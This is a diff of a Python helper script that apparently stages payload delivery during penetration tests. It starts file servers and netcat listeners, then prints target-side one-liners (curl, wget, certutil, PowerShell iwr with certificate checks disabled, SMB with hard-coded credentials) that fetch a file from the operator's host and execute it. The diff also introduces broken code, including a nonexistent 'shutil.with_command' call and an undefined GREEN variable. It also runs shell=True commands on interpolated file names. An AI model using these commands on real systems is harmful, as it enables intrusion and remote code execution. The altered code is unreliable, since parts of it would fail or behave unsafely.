@@ -15,7 +15,6 @@ import urllib.parse
 import signal
 import time
 import shutil
-import getpass
 
 # ── ANSI colours ──────────────────────────────────────────────────────────────
 R  = "\033[0;31m"
@@ -111,7 +110,7 @@ def url_encode(s: str) -> str:
 
 
 def check_command(cmd: str) -> bool:
-    return shutil.which(cmd) is not None
+    return shutil.with_command(cmd) is not None or subprocess.call(f"command -v {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
 
 # ── Logic ─────────────────────────────────────────────────────────────────────
 
@@ -138,7 +137,7 @@ def main():
     print(f"\n{BG}✅ Using {BO}{interface}{NC_COLOR}{BG} at {BO}{local_ip}{NC_COLOR}")
 
     # 2. File Selection
-    files = sorted([f for f in os.listdir('.') if os.path.isfile(f)])
+    files = [f for f in os.listdir('.') if os.path.isfile(f)]
     if not files:
         print(f"{BY}⚠️ No files found in the current directory.{NC_COLOR}")
         sys.exit(0)
@@ -183,7 +182,7 @@ def main():
     proto_choice = choose("Select Protocol:", protocols)
 
     # 5. SCP Username Prompt
-    scp_user = getpass.getuser()
+    scp_user = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'root')
     if proto_choice in ["SCP", "ALL"]:
         scp_user = prompt("Enter username for SCP", scp_user)
         print(f"{BG}✅ Using SCP username: {BO}{scp_user}{NC_COLOR}")
@@ -200,17 +199,13 @@ def main():
         'NC': 9001
     }
     
-    try:
-        is_root = os.getuid() == 0
-    except AttributeError:
-        is_root = False # Windows fallback
-
+    is_root = os.getuid() == 0
     if not is_root:
         print(f"\n{BY}⚠️ WARNING: Non-root user detected. Some ports will fallback to high ports.{NC_COLOR}")
         if ports['HTTP'] < 1024: ports['HTTP'] = 8000
         if ports['HTTPS'] < 1024: ports['HTTPS'] = 8443
         if ports['FTP'] < 1024: ports['FTP'] = 2121
-        if ports['NC'] < 1024: ports['NC'] = 9001
+        if ports['NC'] < 1024: ports['NC'] = 9001 # Already high but being explicit
         print(f"  - HTTP: {ports['HTTP']}\n  - HTTPS: {ports['HTTPS']}\n  - FTP: {ports['FTP']}\n  - NC: {ports['NC']}")
 
     # 7. Generate Commands
@@ -226,9 +221,9 @@ def main():
                 print(f"    {BC}curl -fsSL \"{url}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
                 print(f"    {BC}wget -q --show-progress -O \"{filename}\" \"{url}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
             else:
-                print(f"    {BC}certutil -urlcache -split -f \"{url}\" \"{filename}\" && timeout /t 2 >nul && .\\\"{filename}\"{NC_COLOR}")
-                print(f"    {BC}curl.exe \"{url}\" -o \"{filename}\" && timeout /t 2 >nul && .\\\"{filename}\"{NC_COLOR}")
-                print(f"    {BC}PowerShell -Command \"iwr '{url}' -OutFile '{filename}'; Start-Sleep -s 2; .\\'{filename}'\"{NC_COLOR}")
+                print(f"    {BC}certutil -urlcache -split -f \"{url}\" \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
+                print(f"    {BC}curl.exe \"{url}\" -o \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
+                print(f"    {BC}PowerShell -Command \"iwr '{url}' -OutFile '{filename}'; .\\'{filename}'\"{NC_COLOR}")
 
         if proto_choice in ["HTTPS", "ALL"]:
             print(f"  {BM}▶ HTTPS ({target_os}):{NC_COLOR}")
@@ -237,15 +232,15 @@ def main():
                 print(f"    {BC}curl -k -fsSL \"{url}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
                 print(f"    {BC}wget --no-check-certificate -q --show-progress -O \"{filename}\" \"{url}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
             else:
-                print(f"    {BC}curl.exe -k \"{url}\" -o \"{filename}\" && timeout /t 2 >nul && .\\\"{filename}\"{NC_COLOR}")
-                print(f"    {BC}PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; iwr '{url}' -OutFile '{filename}'; Start-Sleep -s 2; .\\'{filename}'\"{NC_COLOR}")
+                print(f"    {BC}curl.exe -k \"{url}\" -o \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
+                print(f"    {BC}PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; iwr '{url}' -OutFile '{filename}'; .\\'{filename}'\"{NC_COLOR}")
 
         if proto_choice in ["SMB", "ALL"]:
             print(f"  {BM}▶ SMB ({target_os}):{NC_COLOR}")
             if target_os == "linux":
                 print(f"    {BC}smbclient \"//{local_ip}/share\" -c \"get {filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
             else:
-                print(f"    {BC}net use \\\\{local_ip}\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\{local_ip}\\share\\{filename} . && timeout /t 2 >nul && .\\{filename}\"{NC_COLOR}")
+                print(f"    {BC}net use \\\\{local_ip}\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\{local_ip}\\share\\{filename} . && .\\{filename}\"{NC_COLOR}")
 
         if proto_choice in ["FTP", "ALL"]:
             print(f"  {BM}▶ FTP ({target_os}):{NC_COLOR}")
@@ -253,50 +248,42 @@ def main():
             if target_os == "linux":
                 print(f"    {BC}curl -u anonymous: \"{url}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
             else:
-                print(f"    {BC}PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('{url}', '{filename}'); Start-Sleep -s 2; .\\'{filename}'\"{NC_COLOR}")
+                print(f"    {BC}PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('{url}', '{filename}'); .\\'{filename}'\"{NC_COLOR}")
 
         if proto_choice in ["TFTP", "ALL"]:
             print(f"  {BM}▶ TFTP ({target_os}):{NC_COLOR}")
             if target_os == "linux":
                 print(f"    {BC}tftp {local_ip} -c get \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
             else:
-                print(f"    {BC}tftp -i {local_ip} GET \"{filename}\" && timeout /t 2 >nul && .\\\"{filename}\"{NC_COLOR}")
+                print(f"    {BC}tftp -i {local_ip} GET \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
 
         if proto_choice in ["WebDAV", "ALL"]:
             print(f"  {BM}▶ WebDAV ({target_os}):{NC_COLOR}")
             if target_os == "linux":
                 print(f"    {BC}curl -s \"http://{local_ip}:{ports['WEBDAV']}/{enc}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
             else:
-                print(f"    {BC}cmd.exe /c \"copy \\\\{local_ip}@{ports['WEBDAV']}\\DavWWWRoot\\{filename} . && timeout /t 2 >nul && .\\{filename}\"{NC_COLOR}")
+                print(f"    {BC}cmd.exe /c \"copy \\\\{local_ip}@{ports['WEBDAV']}\\DavWWWRoot\\{filename} . && .\\{filename}\"{NC_COLOR}")
 
         if proto_choice in ["DNS", "ALL"]:
             print(f"  {BM}▶ DNS/dnscat2 ({target_os}):{NC_COLOR}")
             print(f"    {BC}dnscat2 --dns server={local_ip},port=53 (In session: download \"{filename}\"){NC_COLOR}")
 
-        if proto_choice == "NC":
-            # NC is handled sequentially in the foreground
-            for f in selected_files:
-                print(f"\n{BG}🟢 Starting Netcat (nc) to send {BO}{f}{NC_COLOR} on port {G}{ports['NC']}{NC_COLOR}")
-                print(f"{Y}ℹ️  Waiting for connection... (Ctrl+C to skip/exit){NC_COLOR}")
-                try:
-                    subprocess.run(f"nc -lnvp {ports['NC']} -q 1 < \"{f}\"", shell=True)
-                    print(f"{BG}✅ Finished sending {f}.{NC_COLOR}")
-                except KeyboardInterrupt:
-                    print(f"\n{BY}⏭️ Skipped {f}.{NC_COLOR}")
-            print(f"\n{BG}✅ All Netcat transfers completed.{NC_COLOR}")
-            sys.exit(0)
+        if proto_choice in ["NC", "ALL"]:
+            print(f"  {BM}▶ Netcat (nc) ({target_os}):{NC_COLOR}")
+            print(f"    {Y}Local (Sender):{NC_COLOR} {BC}nc -lnvp {ports['NC']} -q 1 < \"{filename}\"{NC_COLOR}")
+            nc_target = "nc.exe" if target_os == "windows" else "nc"
+            print(f"    {Y}Target (Receiver):{NC_COLOR} {BC}{nc_target} {local_ip} {ports['NC']} > \"{filename}\"{NC_COLOR}")
 
-        if proto_choice == "SCP":
-            print(f"ℹ️  {BC}SCP{NC_COLOR} is a client-side tool and doesn't require a dedicated server.")
-            print(f"🔑 Ensure your {BO}SSH service{NC_COLOR} is running: {Y}sudo systemctl start ssh{NC_COLOR}")
-            print(f"\n{BY}🛸 Commands are ready above. Press Ctrl+C to exit.{NC_COLOR}\n")
-            while True: time.sleep(1)
+        if proto_choice in ["SCP", "ALL"]:
+            print(f"  {BM}▶ SCP ({target_os}):{NC_COLOR}")
+            scp_cmd = "scp.exe" if target_os == "windows" else "scp"
+            print(f"    {BC}{scp_cmd} {scp_user}@{local_ip}:\"{os.path.join(os.getcwd(), filename)}\" .{NC_COLOR}")
 
     # 8. Start Servers
     section("⚡ STARTING SERVERS")
     processes = []
     
-    def cleanup_handler(sig, frame):
+    def cleanup(sig, frame):
         print(f"\n{BM}🧹 Shutting down servers...{NC_COLOR}")
         for p in processes:
             try:
@@ -306,7 +293,7 @@ def main():
         print(f"{BG}✅ Done.{NC_COLOR}")
         sys.exit(0)
 
-    signal.signal(signal.SIGINT, cleanup_handler)
+    signal.signal(signal.SIGINT, cleanup)
 
     try:
         if proto_choice in ["HTTP", "ALL"]:
@@ -337,13 +324,13 @@ def main():
                 print(f"{BR}❌ ERROR: 'impacket-smbserver' not found.{NC_COLOR}")
 
         if proto_choice in ["FTP", "ALL"]:
-            # Check for pyftpdlib module
-            pyftpdlib_check = subprocess.run([sys.executable, "-m", "pyftpdlib", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            if pyftpdlib_check.returncode == 0:
+            if check_command("pyftpdlib"): # as module
                  print(f"{BG}🟢 Starting python3 pyftpdlib on port {ports['FTP']}...{NC_COLOR}")
                  processes.append(subprocess.Popen([sys.executable, "-m", "pyftpdlib", "-p", str(ports['FTP']), "-d", os.getcwd(), "-u", "anonymous", "-P", ""], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
             elif check_command("vsftpd"):
-                print(f"{BG}🟢 Starting vsftpd (Note: requires manual config in this version)...{NC_COLOR}")
+                print(f"{BG}🟢 Starting vsftpd (requires manual config in this Python port)...{NC_COLOR}")
+                # Note: vsftpd logic is more complex to port perfectly without temp files, but we can try basic call
+                # For brevity in Python, we prefer pyftpdlib
             else:
                 print(f"{BR}❌ ERROR: 'pyftpdlib' not found.{NC_COLOR}")
 
@@ -368,11 +355,31 @@ def main():
             else:
                 print(f"{BR}❌ ERROR: 'dnscat2' not found.{NC_COLOR}")
 
+        if proto_choice == "NC":
+            # NC is handled sequentially in the foreground
+            for f in selected_files:
+                print(f"\n{BG}🟢 Starting Netcat (nc) to send {BO}{f}{NC_COLOR} on port {GREEN}{ports['NC']}{NC_COLOR}")
+                print(f"{Y}ℹ️  Waiting for connection... (Ctrl+C to skip/exit){NC_COLOR}")
+                try:
+                    subprocess.run(f"nc -lnvp {ports['NC']} -q 1 < \"{f}\"", shell=True)
+                    print(f"{BG}✅ Finished sending {f}.{NC_COLOR}")
+                except KeyboardInterrupt:
+                    print(f"\n{BY}⏭️ Skipped {f}.{NC_COLOR}")
+            print(f"\n{BG}✅ All Netcat transfers completed.{NC_COLOR}")
+            sys.exit(0)
+
+        if proto_choice == "SCP":
+            print(f"ℹ️  {BC}SCP{NC_COLOR} is a client-side tool and doesn't require a dedicated server.")
+            print(f"🔑 Ensure your {BO}SSH service{NC_COLOR} is running: {Y}sudo systemctl start ssh{NC_COLOR}")
+            print(f"\n{BY}🛸 Commands are ready above. Press Ctrl+C to exit.{NC_COLOR}\n")
+            while True: time.sleep(1)
+
         if proto_choice == "ALL":
+             # If ALL, we might have NC in background which is tricky, let's just start background ones
              print(f"{BG}🟢 Starting NC listener in background for the first file...{NC_COLOR}")
              processes.append(subprocess.Popen(f"nc -lnvp {ports['NC']} -q 1 < \"{selected_files[0]}\"", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
 
-        if not processes:
+        if not processes and proto_choice != "SCP":
             print(f"{BR}🚨 No servers could be started.{NC_COLOR}")
             sys.exit(1)
 
@@ -381,7 +388,7 @@ def main():
             time.sleep(1)
 
     except KeyboardInterrupt:
-        cleanup_handler(None, None)
+        cleanup(None, None)
 
 
 if __name__ == "__main__":
